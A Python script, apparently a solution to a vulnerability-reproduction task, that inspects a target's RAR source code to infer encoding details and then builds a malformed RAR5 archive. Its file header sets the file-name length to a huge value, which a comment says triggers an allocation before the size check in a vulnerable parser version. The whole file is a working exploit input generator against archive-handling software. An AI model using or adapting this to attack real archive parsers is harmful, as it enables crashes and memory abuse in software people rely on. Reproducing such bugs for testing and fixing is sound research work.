import os
import re
import io
import tarfile
import zipfile
import struct
import zlib
from typing import Optional, List


class Solution:
    def solve(self, src_path: str) -> bytes:
        texts = self._load_relevant_sources(src_path)

        vint_big_endian = self._detect_vint_big_endian(texts)
        size_includes_size_field = self._detect_header_size_includes_size_field(texts)
        crc_includes_size_field = self._detect_crc_includes_size_field(texts)

        def vint(x: int) -> bytes:
            if x < 0:
                x = 0
            if vint_big_endian:
                return self._vint_encode_be(x)
            return self._vint_encode_le(x)

        def make_block(header_data: bytes) -> bytes:
            if size_includes_size_field:
                size_total = len(header_data) + 1
                for _ in range(8):
                    size_bytes = vint(size_total)
                    new_total = len(size_bytes) + len(header_data)
                    if new_total == size_total:
                        break
                    size_total = new_total
                size_bytes = vint(size_total)
            else:
                size_bytes = vint(len(header_data))

            crc_input = (size_bytes + header_data) if crc_includes_size_field else header_data
            crc = zlib.crc32(crc_input) & 0xFFFFFFFF
            return struct.pack("<I", crc) + size_bytes + header_data

        sig = b"Rar!\x1a\x07\x01\x00"

        # Main block: type=1, flags=0, archive_flags=0
        main_hdr = vint(1) + vint(0) + vint(0)
        main_blk = make_block(main_hdr)

        # File block: type=2, flags=HAS_DATA(2), data_size=0
        # file_flags: set mtime+crc present (0x06) to follow common parsing path
        # unpacked_size=0, attributes=0, mtime=0, data_crc=0, comp_info=0, host_os=0
        # name_size=HUGE (triggers allocation before max check in vulnerable version)
        huge_name_size = (1 << 62) - 1
        file_hdr = (
            vint(2) +
            vint(2) +
            vint(0) +
            vint(0x06) +
            vint(0) +
            vint(0) +
            vint(0) +
            b"\x00\x00\x00\x00" +
            vint(0) +
            vint(0) +
            vint(huge_name_size)
        )
        file_blk = make_block(file_hdr)

        # End block: type=5, flags=0
        end_hdr = vint(5) + vint(0)
        end_blk = make_block(end_hdr)

        return sig + main_blk + file_blk + end_blk

    def _load_relevant_sources(self, src_path: str) -> List[str]:
        texts: List[str] = []
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    if not (fn.endswith(".c") or fn.endswith(".h") or fn.endswith(".cc") or fn.endswith(".cpp")):
                        continue
                    if "rar5" not in fn.lower() and "rar" not in fn.lower():
                        continue
                    p = os.path.join(root, fn)
                    try:
                        with open(p, "rb") as f:
                            b = f.read()
                        texts.append(self._bytes_to_text(b))
                    except Exception:
                        pass
            return texts

        # Try tar
        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name_l = (m.name or "").lower()
                    if not (name_l.endswith(".c") or name_l.endswith(".h") or name_l.endswith(".cc") or name_l.endswith(".cpp")):
                        continue
                    if "rar5" not in name_l and "rar" not in name_l:
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        b = f.read()
                        texts.append(self._bytes_to_text(b))
                    except Exception:
                        continue
            return texts
        except Exception:
            pass

        # Try zip
        try:
            with zipfile.ZipFile(src_path, "r") as zf:
                for name in zf.namelist():
                    name_l = name.lower()
                    if not (name_l.endswith(".c") or name_l.endswith(".h") or name_l.endswith(".cc") or name_l.endswith(".cpp")):
                        continue
                    if "rar5" not in name_l and "rar" not in name_l:
                        continue
                    try:
                        b = zf.read(name)
                        texts.append(self._bytes_to_text(b))
                    except Exception:
                        continue
            return texts
        except Exception:
            pass

        return texts

    @staticmethod
    def _bytes_to_text(b: bytes) -> str:
        try:
            return b.decode("utf-8", errors="ignore")
        except Exception:
            return b.decode("latin1", errors="ignore")

    @staticmethod
    def _vint_encode_le(x: int) -> bytes:
        x = int(x) & ((1 << 64) - 1)
        out = bytearray()
        while True:
            byte = x & 0x7F
            x >>= 7
            if x:
                out.append(byte | 0x80)
            else:
                out.append(byte)
                break
        return bytes(out)

    @staticmethod
    def _vint_encode_be(x: int) -> bytes:
        x = int(x) & ((1 << 64) - 1)
        if x == 0:
            return b"\x00"
        groups = []
        while x:
            groups.append(x & 0x7F)
            x >>= 7
        groups.reverse()
        out = bytearray()
        for i, g in enumerate(groups):
            if i != len(groups) - 1:
                out.append(g | 0x80)
            else:
                out.append(g)
        return bytes(out)

    def _detect_vint_big_endian(self, texts: List[str]) -> bool:
        if not texts:
            return False
        for t in texts:
            tl = t.lower()

            if "read_vint" not in tl and "rar5" not in tl:
                continue

            for m in re.finditer(r'\b(read|parse|decode)[a-z0-9_]*vint\b', tl):
                s = max(0, m.start() - 1500)
                e = min(len(tl), m.start() + 2500)
                chunk = tl[s:e]

                # Big-endian style: v = (v<<7) | (b&0x7f)
                if re.search(r'\b\w+\s*=\s*\(\s*\w+\s*<<\s*7\s*\)\s*\|\s*\(\s*\w+\s*&\s*0x7f\s*\)', chunk):
                    return True
                if re.search(r'\b\w+\s*=\s*\w+\s*<<\s*7\b', chunk) and re.search(r'&\s*0x7f', chunk):
                    # Common big-end pattern also includes |=
                    if not re.search(r'<<\s*shift', chunk):
                        return True

                # Little-endian style: v |= (b&0x7f) << shift; shift += 7;
                if re.search(r'\|\=\s*\(\s*\w+\s*&\s*0x7f\s*\)\s*<<\s*\w+', chunk):
                    return False
                if re.search(r'\bshift\s*\+\=\s*7\b', chunk) and re.search(r'<<\s*shift\b', chunk):
                    return False

        return False

    def _detect_header_size_includes_size_field(self, texts: List[str]) -> bool:
        # Default behavior (commonly used by libarchive RAR5): header_size excludes its own bytes.
        # If code shows header_size is adjusted by subtracting consumed bytes including vint length,
        # it's more likely it includes itself.
        for t in texts:
            tl = t.lower()
            if "rar5" not in tl:
                continue
            if re.search(r'header[_ ]size\s*-\=', tl) and re.search(r'vint|varint|size_len|vint_len', tl):
                return True
            if re.search(r'header[_ ]size\s*=\s*[^;]*-\s*[^;]*(vint|varint|size_len|vint_len)', tl):
                return True
            if re.search(r'bytes_remaining\s*=\s*header[_ ]size\s*-\s*', tl) and re.search(r'(vint|varint)', tl):
                return True
        return False

    def _detect_crc_includes_size_field(self, texts: List[str]) -> bool:
        # Default to CRC over header bytes only.
        # If code explicitly mentions including header size field in CRC computation, flip to True.
        for t in texts:
            tl = t.lower()
            if "rar5" not in tl:
                continue
            if "crc" not in tl or "header" not in tl:
                continue

            if re.search(r'crc[^;\n]*header[^;\n]*(include|including)[^;\n]*size', tl):
                return True
            if re.search(r'crc[^;\n]*(size[^;\n]*\+\s*header|header[^;\n]*\+\s*size)', tl):
                return True

            # Heuristic: look for crc32 over a buffer that is built from header size + header bytes
            if re.search(r'crc32\s*\([^)]*(header_size|hdr_size)[^)]*\+\s*[^)]*(vint|varint|size_len|vint_len)', tl):
                return True

        return False